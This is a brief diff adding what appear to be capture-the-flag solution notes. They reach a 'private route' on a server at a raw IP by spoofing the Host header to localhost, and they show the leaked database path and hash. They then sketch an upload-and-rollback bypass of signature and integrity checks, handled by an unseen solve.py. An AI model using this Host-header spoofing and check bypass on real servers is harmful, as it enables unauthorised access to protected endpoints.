@@ -1,0 +1,13 @@
+Access private route (download, integrityStatus, rollback)
+
+curl -H "Lang: integrityStatus" -H "Host: localhost:5000" http://35.200.63.50/apis/coin -v
+
+```
+lang: {"db": "database/master.db", "dbhash": "bf1db96d172223192bbbe9d504f5ace9"}
+```
+
+Upload a file to server (pass SignCheck), execute rollback (pass SignCheck, IntegrityCheck, make 
+	self.dbHash != dbHash
+	and os.path.isfile('backup/'+dbhash)
+to true)
+	python3 solve.py
